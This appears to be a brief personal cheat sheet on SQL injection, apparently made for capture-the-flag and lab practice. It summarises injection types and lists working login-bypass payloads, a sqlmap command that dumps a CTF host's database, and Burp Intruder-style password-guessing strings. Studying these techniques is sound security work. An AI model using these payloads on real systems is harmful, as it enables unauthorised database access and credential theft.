# SQLi (Structured Query Language Injection)

## SQL injection examples:

* **Retrieving hidden data**, where you can modify an SQL query to return additional results.
* **Subverting application logic**, where you can change a query to interfere with the application's logic.
* **UNION attacks**, where you can retrieve data from different database tables.
* **Examining the database**, where you can extract information about the version and structure of the database.
* **Blind SQL injection**, where the results of a query you control are not returned in the application's responses.
  * This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
  * You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
  * You can trigger an out-of-band network interaction, using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.

**SQL injection with filter bypass via XML encoding**

* use BurpSuite and extension Hackvertor









`admin' or 1=1--`

`admin" or 1=1#`

`admin' or '1'='1`

`sqlmap -u https://ba4aeefe40a56952d13df303174a9ff9.ctf.hacker101.com/fetch?id=1 /login --data "username=a&password=b" -p username --dump`

`username=' or LENGTH(password)=§1§#&password=administrator username=' or username LIKE '§`_`§§`_`§§`_`§§`_`§§`_`§§`_`§§`_`§§`_`§'#&password=administrator`
